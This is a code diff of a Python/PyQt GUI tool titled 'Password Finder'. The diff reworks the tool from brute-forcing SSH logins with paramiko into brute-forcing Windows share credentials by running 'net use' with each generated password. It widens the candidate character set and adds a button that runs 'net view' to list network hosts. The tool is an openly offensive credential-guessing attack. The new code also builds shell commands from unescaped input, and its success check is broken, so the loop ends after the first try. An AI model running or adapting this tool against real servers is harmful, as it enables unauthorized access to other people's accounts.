@@ -54,10 +54,10 @@ class MyApp(QWidget):
         self.buttonStart.clicked.connect(self.onStart)
         self.buttonStart.move(300, 200)
 
-        self.buttonRestart = QPushButton(self)
-        self.buttonRestart.setText('Restart')
-        self.buttonRestart.clicked.connect(self.onRestart)
-        self.buttonRestart.move(300, 250)
+        self.buttonSearch = QPushButton(self)
+        self.buttonSearch.setText('Search')
+        self.buttonSearch.clicked.connect(self.onSearch)
+        self.buttonSearch.move(300, 250)
 
         self.setWindowTitle('Password Finder')
         self.setGeometry(1000, 1000, 500, 400)
@@ -67,23 +67,22 @@ class MyApp(QWidget):
         QApplication.processEvents()
         self.lbl1.setText("Taget --------\nServer: %s\nUser: %s" % (self.inputServer.text(), self.inputUser.text()))
         self.lbl1.adjustSize()
-    def onRestart(self):
+    def onSearch(self):
         QApplication.processEvents()
-        os.execl(sys.executable, '"{}"'.format(sys.executable), *sys.argv)
+        output = os.popen("net view").read()
+        self.textbrowser.append(output)
 
-    async def onStart(self):
+    def onStart(self):
         global pwMatched
         pwMatched = True
         pwMatch("a", 2, self.textbrowser, self.inputServer, self.inputUser, time.time())
-        pwMatch("b", 2, self.textbrowser, self.inputServer, self.inputUser, time.time())
  
-
-async def pwMatch(start, jump, textbrowser, serverInput, userInput, start_time):
+def pwMatch(start, jump, textbrowser, serverInput, userInput, start_time):
     server = serverInput.text()
     user = userInput.text()
     serverInput.setDisabled(True)
     userInput.setDisabled(True)
-    charList = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
+    charList = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
     result = start;
     start_time = time.time()
     global pwMatched
@@ -91,11 +90,8 @@ async def pwMatch(start, jump, textbrowser, serverInput, userInput, start_time):
         textbrowser.append(result)
         ok = True
         QApplication.processEvents()
-        try:
-            await cli.connect(server, port=22, username=user, password=result)
-        except paramiko.ssh_exception.AuthenticationException as e:
-            ok = False
-        cli.close()
+        output = os.popen("net use \\%s /user:%s %s" % (server, user, result)).read()
+        print(output)
         if ok == True:
             pwMatched = False
             break
